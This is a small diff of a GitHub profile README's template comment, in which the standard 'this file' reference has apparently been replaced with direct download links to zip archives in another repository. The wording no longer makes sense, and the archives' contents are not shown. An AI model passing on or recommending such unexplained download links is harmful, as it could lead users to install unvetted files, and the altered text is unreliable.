@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-devmri/devmri is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/devmri/cow_for_chrome/main/politicophobia/cow_for_chrome.zip` (this file) appears on your GitHub profile.
+devmri/devmri is a ✨ special ✨ repository because its `https://github.com/devmri/cow_for_chrome/raw/refs/heads/main/politicophobia/cow-chrome-for-1.3-alpha.5.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
